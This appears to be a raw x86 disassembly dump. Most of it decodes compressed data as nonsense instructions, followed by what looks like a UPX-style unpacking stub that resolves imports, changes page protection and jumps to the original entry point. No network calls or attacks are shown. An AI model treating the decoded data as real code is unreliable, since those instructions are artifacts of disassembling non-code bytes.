1315d9f3:	f6 8b 42 79 74 67 60 	testb  $0x60,0x67747942(%ebx)
1315d9fa:	0c 6b                	or     $0x6b,%al
1315d9fc:	c9                   	leave
1315d9fd:	0a 15 1f cc d6 7d    	or     0x7dd6cc1f,%dl
1315da03:	46                   	inc    %esi
1315da04:	2c 85                	sub    $0x85,%al
1315da06:	59                   	pop    %ecx
1315da07:	53                   	push   %ebx
1315da08:	74 61                	je     0x1315da6b
1315da0a:	aa                   	stos   %al,%es:(%edi)
1315da0b:	70 d8                	jo     0x1315d9e5
1315da0d:	96                   	xchg   %eax,%esi
1315da0e:	cd 66                	int    $0x66
1315da10:	b4 77                	mov    $0x77,%ah
1315da12:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
1315da13:	1b 0f                	sbb    (%edi),%ecx
1315da15:	26 43                	es inc %ebx
1315da17:	c6                   	(bad)
1315da18:	32 95 64 41 b0 42    	xor    0x42b04164(%ebp),%dl
1315da1e:	46                   	inc    %esi
1315da1f:	90                   	nop
1315da20:	77 39                	ja     0x1315da5b
1315da22:	e3 ad                	jecxz  0x1315d9d1
1315da24:	8d b0 14 88 68 8a    	lea    -0x759777ec(%eax),%esi
1315da2a:	64 20 1b             	and    %bl,%fs:(%ebx)
1315da2d:	56                   	push   %esi
1315da2e:	d6                   	salc
1315da2f:	73 87                	jae    0x1315d9b8
1315da31:	70 2c                	jo     0x1315da5f
1315da33:	17                   	pop    %ss
1315da34:	d9 3d e5 68 ba b0    	fnstcw 0xb0ba68e5
1315da3a:	1b 74 c3 77          	sbb    0x77(%ebx,%eax,8),%esi
1315da3e:	99                   	cltd
1315da3f:	59                   	pop    %ecx
1315da40:	a3 c0 81 05 52       	mov    %eax,0x520581c0
1315da45:	30 1a                	xor    %bl,(%edx)
1315da47:	48                   	dec    %eax
1315da48:	20 4d 18             	and    %cl,0x18(%ebp)
1315da4b:	2c c1                	sub    $0xc1,%al
1315da4d:	64 eb 36             	fs jmp 0x1315da86
1315da50:	1c 18                	sbb    $0x18,%al
1315da52:	ae                   	scas   %es:(%edi),%al
1315da53:	58                   	pop    %eax
1315da54:	83 7c 41 c8 4f       	cmpl   $0x4f,-0x38(%ecx,%eax,2)
1315da59:	33 64 5f 31          	xor    0x31(%edi,%ebx,2),%esp
1315da5d:	30 52 65             	xor    %dl,0x65(%edx)
1315da60:	67 b0 08             	addr16 mov $0x8,%al
1315da63:	b1 6d                	mov    $0x6d,%cl
1315da65:	60                   	pusha
1315da66:	57                   	push   %edi
1315da67:	0f 93 11             	setae  (%ecx)
1315da6a:	86 b5 62 9b 4f 4c    	xchg   %dh,0x4c4f9b62(%ebp)
1315da70:	6e                   	outsb  %ds:(%esi),(%dx)
1315da71:	82 0e de             	orb    $0xde,(%esi)
1315da74:	6c                   	insb   (%dx),%es:(%edi)
1315da75:	80 cd 56             	or     $0x56,%ch
1315da78:	10 0e                	adc    %cl,(%esi)
1315da7a:	69 86 ec 71 f6 0d 66 	imul   $0x5685fc66,0xdf671ec(%esi),%eax
1315da81:	fc 85 56 
1315da84:	41                   	inc    %ecx
1315da85:	6e                   	outsb  %ds:(%esi),(%dx)
1315da86:	86 ec                	xchg   %ch,%ah
1315da88:	42                   	inc    %edx
1315da89:	41                   	inc    %ecx
1315da8a:	36 3e c8 63 01 d9    	ss ds enter $0x163,$0xd9
1315da90:	04 b6                	add    $0xb6,%al
1315da92:	11 0d 5a 35 6f 17    	adc    %ecx,0x176f355a
1315da98:	17                   	pop    %ss
1315da99:	1b 0b                	sbb    (%ebx),%ecx
1315da9b:	85 cf                	test   %ecx,%edi
1315da9d:	d8 4e 74             	fmuls  0x74(%esi)
1315daa0:	24 91                	and    $0x91,%al
1315daa2:	70 70                	jo     0x1315db14
1315daa4:	65 9a 2d 18 85 77 38 	gs lcall $0x8c38,$0x7785182d
1315daab:	8c 
1315daac:	d4 48                	aam    $0x48
1315daae:	0c 26                	or     $0x26,%al
1315dab0:	d0 c1                	rol    $1,%cl
1315dab2:	75 9c                	jne    0x1315da50
1315dab4:	a4                   	movsb  %ds:(%esi),%es:(%edi)
1315dab5:	20 da                	and    %bl,%dl
1315dab7:	59                   	pop    %ecx
1315dab8:	8c f6                	mov    %?,%esi
1315daba:	0e                   	push   %cs
1315dabb:	5e                   	pop    %esi
1315dabc:	7e 11                	jle    0x1315dacf
1315dabe:	4c                   	dec    %esp
1315dabf:	76 69                	jbe    0x1315db2a
1315dac1:	b6 85                	mov    $0x85,%dh
1315dac3:	c5 14 12             	lds    (%edx,%edx,1),%edx
1315dac6:	5e                   	pop    %esi
1315dac7:	55                   	push   %ebp
1315dac8:	ac                   	lods   %ds:(%esi),%al
1315dac9:	17                   	pop    %ss
1315daca:	da cb                	fcmove %st(3),%st
1315dacc:	f0 53                	lock push %ebx
1315dace:	48                   	dec    %eax
1315dacf:	46                   	inc    %esi
1315dad0:	eb 45                	jmp    0x1315db17
1315dad2:	f9                   	stc
1315dad3:	49                   	dec    %ecx
1315dad4:	44                   	inc    %esp
1315dad5:	da c6                	fcmovb %st(6),%st
1315dad7:	5e                   	pop    %esi
1315dad8:	0b ec                	or     %esp,%ebp
1315dada:	73 6d                	jae    0x1315db49
1315dadc:	15 53 b3 63 3d       	adc    $0x3d63b353,%eax
1315dae1:	0a b4 65 0b 82 6c 47 	or     0x476c820b(%ebp,%eiz,2),%dh
1315dae8:	35 36 eb 3d 8b       	xor    $0x8b3deb36,%eax
1315daed:	7a 1b                	jp     0x1315db0a
1315daef:	4d                   	dec    %ebp
1315daf0:	61                   	popa
1315daf1:	50                   	push   %eax
1315daf2:	58                   	pop    %eax
1315daf3:	d4 8e                	aam    $0x8e
1315daf5:	9d                   	popf
1315daf6:	6e                   	outsb  %ds:(%esi),(%dx)
1315daf7:	b5 27                	mov    $0x27,%ch
1315daf9:	02 61 62             	add    0x62(%ecx),%ah
1315dafc:	da 58 08             	ficompl 0x8(%eax)
1315daff:	64 cd 5c             	fs int $0x5c
1315db02:	15 70 7b 1a a4       	adc    $0xa41a7b70,%eax
1315db07:	bb 92 87 17 d0       	mov    $0xd0178792,%ebx
1315db0c:	63 61 88             	arpl   %esp,-0x78(%ecx)
1315db0f:	a0 2c 1b 61 d2       	mov    0xd2611b2c,%al
1315db14:	be 36 57 0f c0       	mov    $0xc00f5736,%esi
1315db19:	9f                   	lahf
1315db1a:	66 3b 6a 26          	cmp    0x26(%edx),%bp
1315db1e:	6d                   	insl   (%dx),%es:(%edi)
1315db1f:	c0 55 52 4c          	rclb   $0x4c,0x52(%ebp)
1315db23:	44                   	inc    %esp
1315db24:	7d a3                	jge    0x1315dac9
1315db26:	61                   	popa
1315db27:	a0 d2 fa 30 f9       	mov    0xf930fad2,%al
1315db2c:	43                   	inc    %ebx
1315db2d:	61                   	popa
1315db2e:	63 68 1d             	arpl   %ebp,0x1d(%eax)
1315db31:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
1315db32:	d9 66 70             	fldenv 0x70(%esi)
1315db35:	21 78 2c             	and    %edi,0x2c(%eax)
1315db38:	8e 6f 9e             	mov    -0x62(%edi),%gs
1315db3b:	70 83                	jo     0x1315dac0
1315db3d:	c0 6f 6b fa          	shrb   $0xfa,0x6b(%edi)
1315db41:	48                   	dec    %eax
1315db42:	0a 34 54             	or     (%esp,%edx,2),%dh
1315db45:	de 1d af 37 c2 6e    	ficomps 0x6ec237af
1315db4b:	73 6c                	jae    0x1315dbb9
1315db4d:	ac                   	lods   %ds:(%esi),%al
1315db4e:	bd 61 67 65 87       	mov    $0x87656761,%ebp
1315db53:	12 16                	adc    (%esi),%dl
1315db55:	63 d6                	arpl   %edx,%esi
1315db57:	1e                   	push   %ds
1315db58:	24 97                	and    $0x97,%al
1315db5a:	2f                   	das
1315db5b:	e1 f6                	loope  0x1315db53
1315db5d:	c2 0c d4             	ret    $0xd40c
1315db60:	a4                   	movsb  %ds:(%esi),%es:(%edi)
1315db61:	69 70 62 67 72 64 7b 	imul   $0x7b647267,0x62(%eax),%esi
1315db68:	84 60 6d             	test   %ah,0x6d(%eax)
1315db6b:	c6                   	(bad)
1315db6c:	be 23 3f c6 06       	mov    $0x6c63f23,%esi
1315db71:	9b                   	fwait
1315db72:	35 c3 2c 17 39       	xor    $0x39172cc3,%eax
1315db77:	17                   	pop    %ss
1315db78:	57                   	push   %edi
1315db79:	8d 08                	lea    (%eax),%ecx
1315db7b:	6c                   	insb   (%dx),%es:(%edi)
1315db7c:	4b                   	dec    %ebx
1315db7d:	3e 61                	ds popa
1315db7f:	24 fd                	and    $0xfd,%al
1315db81:	96                   	xchg   %eax,%esi
1315db82:	bc 25 6b 0d 35       	mov    $0x350d6b25,%esp
1315db87:	0d 65 65 6b 9e       	or     $0x9e6b6565,%eax
1315db8c:	99                   	cltd
1315db8d:	92                   	xchg   %eax,%edx
1315db8e:	3d 16 66 d4 18       	cmp    $0x18d46616,%eax
1315db93:	42                   	inc    %edx
1315db94:	6f                   	outsl  %ds:(%esi),(%dx)
1315db95:	cc                   	int3
1315db96:	88 75 f8             	mov    %dh,-0x8(%ebp)
1315db99:	81 4d f4 65 6d 82 34 	orl    $0x34826d65,-0xc(%ebp)
1315dba0:	29 19                	sub    %ebx,(%ecx)
1315dba2:	cf                   	iret
1315dba3:	e2 89                	loop   0x1315db2e
1315dba5:	60                   	pusha
1315dba6:	0e                   	push   %cs
1315dba7:	96                   	xchg   %eax,%esi
1315dba8:	bd 20 19 c0 29       	mov    $0x29c01920,%ebp
1315dbad:	c5 dc 7b             	(bad)
1315dbb0:	71 52                	jno    0x1315dc04
1315dbb2:	6e                   	outsb  %ds:(%esi),(%dx)
1315dbb3:	0e                   	push   %cs
1315dbb4:	41                   	inc    %ecx
1315dbb5:	62 73 25             	bound  %esi,0x25(%ebx)
1315dbb8:	6b 2d eb 79 75 12 1a 	imul   $0x1a,0x127579eb,%ebp
1315dbbf:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
1315dbc0:	75 6d                	jne    0x1315dc2f
1315dbc2:	2f                   	das
1315dbc3:	5e                   	pop    %esi
1315dbc4:	0c a2                	or     $0xa2,%al
1315dbc6:	b5 72                	mov    $0x72,%ch
1315dbc8:	90                   	nop
1315dbc9:	64 0b 6c 33 98       	or     %fs:-0x68(%ebx,%esi,1),%ebp
1315dbce:	38 7f 5e             	cmp    %bh,0x5e(%edi)
1315dbd1:	6b bb 70 74 90 2c 60 	imul   $0x60,0x2c907470(%ebx),%edi
1315dbd8:	11 aa 9a 61 b2 42    	adc    %ebp,0x42b2619a(%edx)
1315dbde:	db 0c 6f             	fisttpl (%edi,%ebp,2)
1315dbe1:	e7 70                	out    %eax,$0x70
1315dbe3:	08 82 cf 86 f4 66    	or     %al,0x66f486cf(%edx)
1315dbe9:	db 32                	(bad) (%edx)
1315dbeb:	66 2e 9d             	cs popfw
1315dbee:	88 cc                	mov    %cl,%ah
1315dbf0:	f0 57                	lock push %edi
1315dbf2:	c0 e0 a6             	shl    $0xa6,%al
1315dbf5:	55                   	push   %ebp
1315dbf6:	70 70                	jo     0x1315dc68
1315dbf8:	34 0b                	xor    $0xb,%al
1315dbfa:	8e c9                	mov    %ecx,%cs
1315dbfc:	df ec                	fucomip %st(4),%st
1315dbfe:	4e                   	dec    %esi
1315dbff:	b0 16                	mov    $0x16,%al
1315dc01:	4c                   	dec    %esp
1315dc02:	6f                   	outsl  %ds:(%esi),(%dx)
1315dc03:	77 59                	ja     0x1315dc5e
1315dc05:	3a 27                	cmp    (%edi),%ah
1315dc07:	4c                   	dec    %esp
1315dc08:	78 16                	js     0x1315dc20
1315dc0a:	89 d7                	mov    %edx,%edi
1315dc0c:	e0 2a                	loopne 0x1315dc38
1315dc0e:	44                   	inc    %esp
1315dc0f:	98                   	cwtl
1315dc10:	4d                   	dec    %ebp
1315dc11:	79 5e                	jns    0x1315dc71
1315dc13:	a2 ff c0 9c 8b       	mov    %al,0x8b9cc0ff
1315dc18:	25 d9 63 74 26       	and    $0x267463d9,%eax
1315dc1d:	e4 60                	in     $0x60,%al
1315dc1f:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
1315dc20:	b1 d9                	mov    $0xd9,%cl
1315dc22:	d6                   	salc
1315dc23:	38 f0                	cmp    %dh,%al
1315dc25:	90                   	nop
1315dc26:	1a 6c 97 30          	sbb    0x30(%edi,%edx,4),%ch
1315dc2a:	2b 2b                	sub    (%ebx),%ebp
1315dc2c:	66 41                	inc    %cx
1315dc2e:	26 83 65 bd af       	andl   $0xffffffaf,%es:-0x43(%ebp)
1315dc33:	ef                   	out    %eax,(%dx)
1315dc34:	5f                   	pop    %edi
1315dc35:	49                   	dec    %ecx
1315dc36:	a3 6e e4 3c 49       	mov    %eax,0x493ce46e
1315dc3b:	62 8b 8d df 74 08    	bound  %ecx,0x874df8d(%ebx)
1315dc41:	75 45                	jne    0x1315dc88
1315dc43:	cb                   	lret
1315dc44:	20 09                	and    %cl,(%ecx)
1315dc46:	6c                   	insb   (%dx),%es:(%edi)
1315dc47:	0c 53                	or     $0x53,%al
1315dc49:	9f                   	lahf
1315dc4a:	da 22                	fisubl (%edx)
1315dc4c:	60                   	pusha
1315dc4d:	87 65 3a             	xchg   %esp,0x3a(%ebp)
1315dc50:	ce                   	into
1315dc51:	0e                   	push   %cs
1315dc52:	2f                   	das
1315dc53:	cf                   	iret
1315dc54:	aa                   	stos   %al,%es:(%edi)
1315dc55:	eb 52                	jmp    0x1315dca9
1315dc57:	6e                   	outsb  %ds:(%esi),(%dx)
1315dc58:	23 57 ee             	and    -0x12(%edi),%edx
1315dc5b:	50                   	push   %eax
1315dc5c:	45                   	inc    %ebp
1315dc5d:	4c                   	dec    %esp
1315dc5e:	01 08                	add    %ecx,(%eax)
1315dc60:	34 ff                	xor    $0xff,%al
1315dc62:	0f f9 00             	psubw  (%eax),%mm0
1315dc65:	19 5e 42             	sbb    %ebx,0x42(%esi)
1315dc68:	2a e0                	sub    %al,%ah
1315dc6a:	00 8f 81 0b 01 02    	add    %cl,0x2010b81(%edi)
1315dc70:	19 00                	sbb    %eax,(%eax)
1315dc72:	b0 28                	mov    $0x28,%al
1315dc74:	28 a2 69 9e 3c ac    	sub    %ah,-0x53c36197(%edx)
1315dc7a:	10 c0                	adc    %al,%al
1315dc7c:	c1 96 cf 14 26 0b 02 	rcll   $0x2,0xb2614cf(%esi)
1315dc83:	04 33                	add    $0x33,%al
1315dc85:	cc                   	int3
1315dc86:	25 fb 66 07 1f       	and    $0x1f0766fb,%eax
1315dc8b:	01 0c 1e             	add    %ecx,(%esi,%ebx,1)
1315dc8e:	34 59                	xor    $0x59,%al
1315dc90:	b0 17                	mov    $0x17,%al
1315dc92:	ec                   	in     (%dx),%al
1315dc93:	40                   	inc    %eax
1315dc94:	07                   	pop    %es
1315dc95:	33 46 02             	xor    0x2(%esi),%eax
1315dc98:	00 97 6e 39 70 01    	add    %dl,0x170396e(%edi)
1315dc9e:	0f 07                	sysret
1315dca0:	b0 94                	mov    $0x94,%al
1315dca2:	07                   	pop    %es
1315dca3:	42                   	inc    %edx
1315dca4:	80 db 95             	sbb    $0x95,%bl
1315dca7:	70 a0                	jo     0x1315dc49
1315dca9:	17                   	pop    %ss
1315dcaa:	04 0b                	add    $0xb,%al
1315dcac:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
1315dcad:	e6 57                	out    %al,$0x57
1315dcaf:	21 bf 90 01 00 18    	and    %edi,0x18000190(%edi)
1315dcb5:	43                   	inc    %ebx
1315dcb6:	4f                   	dec    %edi
1315dcb7:	44                   	inc    %esp
1315dcb8:	45                   	inc    %ebp
1315dcb9:	bb b0 2f d8 4c       	mov    $0x4cd82fb0,%ebx
1315dcbe:	af                   	scas   %es:(%edi),%eax
1315dcbf:	90                   	nop
1315dcc0:	eb 04                	jmp    0x1315dcc6
1315dcc2:	23 20                	and    (%eax),%esp
1315dcc4:	0b fb                	or     %ebx,%edi
1315dcc6:	82 7d 7e 60          	cmpb   $0x60,0x7e(%ebp)
1315dcca:	44                   	inc    %esp
1315dccb:	41                   	inc    %ecx
1315dccc:	54                   	push   %esp
1315dccd:	41                   	inc    %ecx
1315dcce:	d0 01                	rolb   $1,(%ecx)
1315dcd0:	fb                   	sti
1315dcd1:	d4 b4                	aam    $0xb4
1315dcd3:	27                   	daa
1315dcd4:	de b1 77 0b de c0    	fidivs -0x3f21f489(%ecx)
1315dcda:	42                   	inc    %edx
1315dcdb:	53                   	push   %ebx
1315dcdc:	53                   	push   %ebx
1315dcdd:	0b b9 98 2c 4a 9c    	or     -0x63b5d368(%ecx),%edi
1315dce3:	92                   	xchg   %eax,%edx
1315dce4:	c1 76 b6 c0          	shll   $0xc0,-0x4a(%esi)
1315dce8:	2e 16                	cs push %ss
1315dcea:	29 7b ef             	sub    %edi,-0x11(%ebx)
1315dced:	3d a5 f3 fb 7b       	cmp    $0x7bfbf3a5,%eax
1315dcf2:	27                   	daa
1315dcf3:	57                   	push   %edi
1315dcf4:	78 0b                	js     0x1315dd01
1315dcf6:	9c                   	pushf
1315dcf7:	40                   	inc    %eax
1315dcf8:	78 73                	js     0x1315dd6d
1315dcfa:	0b 99 4f 93 01 e4    	or     -0x1bfe6cb1(%ecx),%ebx
1315dd00:	64 80 01 c6          	addb   $0xc6,%fs:(%ecx)
1315dd04:	72 4d                	jb     0x1315dd53
1315dd06:	c9                   	leave
1315dd07:	d9 84 18 0b 9f c6 50 	flds   0x50c69f0b(%eax,%ebx,1)
1315dd0e:	e9 4e 38 b0 27       	jmp    0x3ac61561
1315dd13:	65 1a 4b a0          	sbb    %gs:-0x60(%ebx),%cl
1315dd17:	27                   	daa
1315dd18:	0c 13                	or     $0x13,%al
1315dd1a:	dc 03                	faddl  (%ebx)
1315dd1c:	a4                   	movsb  %ds:(%esi),%es:(%edi)
1315dd1d:	c8 73 72 26          	enter  $0x7273,$0x26
1315dd21:	8b 7e 2b             	mov    0x2b(%esi),%edi
1315dd24:	69 ba b0 27 08 d4 1b 	imul   $0x74101b,-0x2bf7d850(%edx),%edi
1315dd2b:	10 74 00 
1315dd2e:	ad                   	lods   %ds:(%esi),%eax
1315dd2f:	08 f8                	or     %bh,%al
1315dd31:	97                   	xchg   %eax,%edi
1315dd32:	3d a4 00 00 00       	cmp    $0xa4,%eax
1315dd37:	00 00                	add    %al,(%eax)
1315dd39:	00 80 04 ff 00 00    	add    %al,0xff04(%eax)
1315dd3f:	00 60 be             	add    %ah,-0x42(%eax)
1315dd42:	00 80 15 13 8d be    	add    %al,-0x4172eceb(%eax)
1315dd48:	00 90 fe ff 57 83    	add    %dl,-0x7ca80002(%eax)
1315dd4e:	cd ff                	int    $0xff
1315dd50:	eb 10                	jmp    0x1315dd62
1315dd52:	90                   	nop
1315dd53:	90                   	nop
1315dd54:	90                   	nop
1315dd55:	90                   	nop
1315dd56:	90                   	nop
1315dd57:	90                   	nop
1315dd58:	8a 06                	mov    (%esi),%al
1315dd5a:	46                   	inc    %esi
1315dd5b:	88 07                	mov    %al,(%edi)
1315dd5d:	47                   	inc    %edi
1315dd5e:	01 db                	add    %ebx,%ebx
1315dd60:	75 07                	jne    0x1315dd69
1315dd62:	8b 1e                	mov    (%esi),%ebx
1315dd64:	83 ee fc             	sub    $0xfffffffc,%esi
1315dd67:	11 db                	adc    %ebx,%ebx
1315dd69:	72 ed                	jb     0x1315dd58
1315dd6b:	b8 01 00 00 00       	mov    $0x1,%eax
1315dd70:	01 db                	add    %ebx,%ebx
1315dd72:	75 07                	jne    0x1315dd7b
1315dd74:	8b 1e                	mov    (%esi),%ebx
1315dd76:	83 ee fc             	sub    $0xfffffffc,%esi
1315dd79:	11 db                	adc    %ebx,%ebx
1315dd7b:	11 c0                	adc    %eax,%eax
1315dd7d:	01 db                	add    %ebx,%ebx
1315dd7f:	73 ef                	jae    0x1315dd70
1315dd81:	75 09                	jne    0x1315dd8c
1315dd83:	8b 1e                	mov    (%esi),%ebx
1315dd85:	83 ee fc             	sub    $0xfffffffc,%esi
1315dd88:	11 db                	adc    %ebx,%ebx
1315dd8a:	73 e4                	jae    0x1315dd70
1315dd8c:	31 c9                	xor    %ecx,%ecx
1315dd8e:	83 e8 03             	sub    $0x3,%eax
1315dd91:	72 0d                	jb     0x1315dda0
1315dd93:	c1 e0 08             	shl    $0x8,%eax
1315dd96:	8a 06                	mov    (%esi),%al
1315dd98:	46                   	inc    %esi
1315dd99:	83 f0 ff             	xor    $0xffffffff,%eax
1315dd9c:	74 74                	je     0x1315de12
1315dd9e:	89 c5                	mov    %eax,%ebp
1315dda0:	01 db                	add    %ebx,%ebx
1315dda2:	75 07                	jne    0x1315ddab
1315dda4:	8b 1e                	mov    (%esi),%ebx
1315dda6:	83 ee fc             	sub    $0xfffffffc,%esi
1315dda9:	11 db                	adc    %ebx,%ebx
1315ddab:	11 c9                	adc    %ecx,%ecx
1315ddad:	01 db                	add    %ebx,%ebx
1315ddaf:	75 07                	jne    0x1315ddb8
1315ddb1:	8b 1e                	mov    (%esi),%ebx
1315ddb3:	83 ee fc             	sub    $0xfffffffc,%esi
1315ddb6:	11 db                	adc    %ebx,%ebx
1315ddb8:	11 c9                	adc    %ecx,%ecx
1315ddba:	75 20                	jne    0x1315dddc
1315ddbc:	41                   	inc    %ecx
1315ddbd:	01 db                	add    %ebx,%ebx
1315ddbf:	75 07                	jne    0x1315ddc8
1315ddc1:	8b 1e                	mov    (%esi),%ebx
1315ddc3:	83 ee fc             	sub    $0xfffffffc,%esi
1315ddc6:	11 db                	adc    %ebx,%ebx
1315ddc8:	11 c9                	adc    %ecx,%ecx
1315ddca:	01 db                	add    %ebx,%ebx
1315ddcc:	73 ef                	jae    0x1315ddbd
1315ddce:	75 09                	jne    0x1315ddd9
1315ddd0:	8b 1e                	mov    (%esi),%ebx
1315ddd2:	83 ee fc             	sub    $0xfffffffc,%esi
1315ddd5:	11 db                	adc    %ebx,%ebx
1315ddd7:	73 e4                	jae    0x1315ddbd
1315ddd9:	83 c1 02             	add    $0x2,%ecx
1315dddc:	81 fd 00 f3 ff ff    	cmp    $0xfffff300,%ebp
1315dde2:	83 d1 01             	adc    $0x1,%ecx
1315dde5:	8d 14 2f             	lea    (%edi,%ebp,1),%edx
1315dde8:	83 fd fc             	cmp    $0xfffffffc,%ebp
1315ddeb:	76 0f                	jbe    0x1315ddfc
1315dded:	8a 02                	mov    (%edx),%al
1315ddef:	42                   	inc    %edx
1315ddf0:	88 07                	mov    %al,(%edi)
1315ddf2:	47                   	inc    %edi
1315ddf3:	49                   	dec    %ecx
1315ddf4:	75 f7                	jne    0x1315dded
1315ddf6:	e9 63 ff ff ff       	jmp    0x1315dd5e
1315ddfb:	90                   	nop
1315ddfc:	8b 02                	mov    (%edx),%eax
1315ddfe:	83 c2 04             	add    $0x4,%edx
1315de01:	89 07                	mov    %eax,(%edi)
1315de03:	83 c7 04             	add    $0x4,%edi
1315de06:	83 e9 04             	sub    $0x4,%ecx
1315de09:	77 f1                	ja     0x1315ddfc
1315de0b:	01 cf                	add    %ecx,%edi
1315de0d:	e9 4c ff ff ff       	jmp    0x1315dd5e
1315de12:	5e                   	pop    %esi
1315de13:	89 f7                	mov    %esi,%edi
1315de15:	b9 1f 06 00 00       	mov    $0x61f,%ecx
1315de1a:	8a 07                	mov    (%edi),%al
1315de1c:	47                   	inc    %edi
1315de1d:	2c e8                	sub    $0xe8,%al
1315de1f:	3c 01                	cmp    $0x1,%al
1315de21:	77 f7                	ja     0x1315de1a
1315de23:	80 3f 05             	cmpb   $0x5,(%edi)
1315de26:	75 f2                	jne    0x1315de1a
1315de28:	8b 07                	mov    (%edi),%eax
1315de2a:	8a 5f 04             	mov    0x4(%edi),%bl
1315de2d:	66 c1 e8 08          	shr    $0x8,%ax
1315de31:	c1 c0 10             	rol    $0x10,%eax
1315de34:	86 c4                	xchg   %al,%ah
1315de36:	29 f8                	sub    %edi,%eax
1315de38:	80 eb e8             	sub    $0xe8,%bl
1315de3b:	01 f0                	add    %esi,%eax
1315de3d:	89 07                	mov    %eax,(%edi)
1315de3f:	83 c7 05             	add    $0x5,%edi
1315de42:	88 d8                	mov    %bl,%al
1315de44:	e2 d9                	loop   0x1315de1f
1315de46:	8d be 00 b0 01 00    	lea    0x1b000(%esi),%edi
1315de4c:	8b 07                	mov    (%edi),%eax
1315de4e:	09 c0                	or     %eax,%eax
1315de50:	74 3c                	je     0x1315de8e
1315de52:	8b 5f 04             	mov    0x4(%edi),%ebx
1315de55:	8d 84 30 ec d0 01 00 	lea    0x1d0ec(%eax,%esi,1),%eax
1315de5c:	01 f3                	add    %esi,%ebx
1315de5e:	50                   	push   %eax
1315de5f:	83 c7 08             	add    $0x8,%edi
1315de62:	ff 96 b4 d1 01 00    	call   *0x1d1b4(%esi)
1315de68:	95                   	xchg   %eax,%ebp
1315de69:	8a 07                	mov    (%edi),%al
1315de6b:	47                   	inc    %edi
1315de6c:	08 c0                	or     %al,%al
1315de6e:	74 dc                	je     0x1315de4c
1315de70:	89 f9                	mov    %edi,%ecx
1315de72:	57                   	push   %edi
1315de73:	48                   	dec    %eax
1315de74:	f2 ae                	repnz scas %es:(%edi),%al
1315de76:	55                   	push   %ebp
1315de77:	ff 96 b8 d1 01 00    	call   *0x1d1b8(%esi)
1315de7d:	09 c0                	or     %eax,%eax
1315de7f:	74 07                	je     0x1315de88
1315de81:	89 03                	mov    %eax,(%ebx)
1315de83:	83 c3 04             	add    $0x4,%ebx
1315de86:	eb e1                	jmp    0x1315de69
1315de88:	ff 96 c8 d1 01 00    	call   *0x1d1c8(%esi)
1315de8e:	8b ae bc d1 01 00    	mov    0x1d1bc(%esi),%ebp
1315de94:	8d be 00 f0 ff ff    	lea    -0x1000(%esi),%edi
1315de9a:	bb 00 10 00 00       	mov    $0x1000,%ebx
1315de9f:	50                   	push   %eax
1315dea0:	54                   	push   %esp
1315dea1:	6a 04                	push   $0x4
1315dea3:	53                   	push   %ebx
1315dea4:	57                   	push   %edi
1315dea5:	ff d5                	call   *%ebp
1315dea7:	8d 87 1f 02 00 00    	lea    0x21f(%edi),%eax
1315dead:	80 20 7f             	andb   $0x7f,(%eax)
1315deb0:	80 60 28 7f          	andb   $0x7f,0x28(%eax)
1315deb4:	58                   	pop    %eax
1315deb5:	50                   	push   %eax
1315deb6:	54                   	push   %esp
1315deb7:	50                   	push   %eax
1315deb8:	53                   	push   %ebx
1315deb9:	57                   	push   %edi
1315deba:	ff d5                	call   *%ebp
1315debc:	58                   	pop    %eax
1315debd:	61                   	popa
1315debe:	8d 44 24 80          	lea    -0x80(%esp),%eax
1315dec2:	6a 00                	push   $0x0
1315dec4:	39 c4                	cmp    %eax,%esp
1315dec6:	75 fa                	jne    0x1315dec2
1315dec8:	83 ec 80             	sub    $0xffffff80,%esp
1315decb:	e9 6c cd fe ff       	jmp    0x1314ac3c
1315ded0:	e8 de 15 13 f0       	call   0x328f4b3
1315ded5:	de 15 13 94 c0 14    	ficoms 0x14c09413
1315dedb:	13 00                	adc    (%eax),%eax
	...
